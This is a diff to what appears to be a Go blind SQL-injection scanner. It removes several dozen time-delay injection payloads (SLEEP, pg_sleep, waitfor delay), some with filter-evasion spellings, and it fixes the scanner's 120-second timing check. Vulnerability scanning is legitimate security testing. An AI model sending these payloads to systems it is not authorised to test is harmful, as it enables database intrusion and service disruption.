@@ -13,48 +13,6 @@ import (
 )
 
 var sql_payloads = []string{
-	"1'",
-	"1 || SLsleepEEP(120)",
-	"1' || SLsleepEEP(120)'",
-	"1\\'||SLsleepEEP(120)\\'",
-	"1/**/||/**/SLsleepEEP(120)",
-	"1'/**/||/**/SLsleepEEP(120)'",
-	"1\\'/**/||/**/SLsleepEEP(120)\\'",
-	"1 || SLEEP(120)",
-	"1/**/||/**/SLEEP(120)",
-	"1'/**/||/**/SLEEP(120)'",
-	"1\\'/**/||/**/SLEEP(120)\\'",
-	"1' || SLEEP(120)'",
-	"1\\' || SLEEP(120)\\'",
-	"1 OR SLEEP(120)",
-	"1' OR SLEEP(120)'",
-	"1\\' OR SLEEP(120)\\'",
-	"1/**/OR/**/SLEEP(120)",
-	"1'/**/OR/**/SLEEP(120)'",
-	"1\\'/**/OR/**/SLEEP(120)\\'",
-	"1 OorR SLsleepEEP(120)",
-	"1' OorR SLsleepEEP(120)'",
-	"1\\' OorR SLsleepEEP(120)\\'",
-	"1 || waitfor delay '00:00:120'",
-	"1 OR waitfor delay '00:00:120'",
-	"1' OR waitfor delay '00:00:120'",
-	"1\\'  OR waitfor delay \\'00:00:120",
-	"1\\' || waitfor delay \\'00:00:120",
-	"1' || waitfor delay '00:00:120",
-	"1' OR SLEEP(120); --",
-	"1' OR SLEEP(120); -- -",
-	"1 OR SLEEP(120); --",
-	"1 OR SLEEP(120); -- -",
-	"1 || waitfor delay '00:00:120'; --",
-	"1' || waitfor delay '00:00:120'; --",
-	"1' OR waitfor delay '00:00:120'; --",
-	"1' OR pg_sleep(120)'",
-	"1 OR pg_sleep(120)",
-	"1 OR pg_sleep(120);--",
-	"1 OR pg_sleep(120); -- -",
-	"1' OR pg_sleep(120);--",
-	"1 OorR pg_sleep(120);",
-	"1' OorR pg_sleep(120);--",
 	"sleep(120)#",
 	"1 or sleep(120)#",
 	"\" or sleep(120)#",
@@ -140,7 +98,7 @@ func CheckContains(url_t string) bool {
 
 func TestOneByOneSQLi(url_t string, name string, wg *sync.WaitGroup, sem chan bool) {
 	defer wg.Done()
-	<-sem	
+	<-sem
 	payloads := url.Values{}
 	var new_url string
 	for _, sql_payload := range sql_payloads {
@@ -156,7 +114,7 @@ func TestOneByOneSQLi(url_t string, name string, wg *sync.WaitGroup, sem chan bo
 		if err != nil {
 			continue
 		} else {
-			if time.Since(start) > 120 {
+			if time.Since(start).Seconds() > 120 {
 				fmt.Printf("Possibly vulnerable to SQLi ---> %s\n", new_url)
 			}
 		}
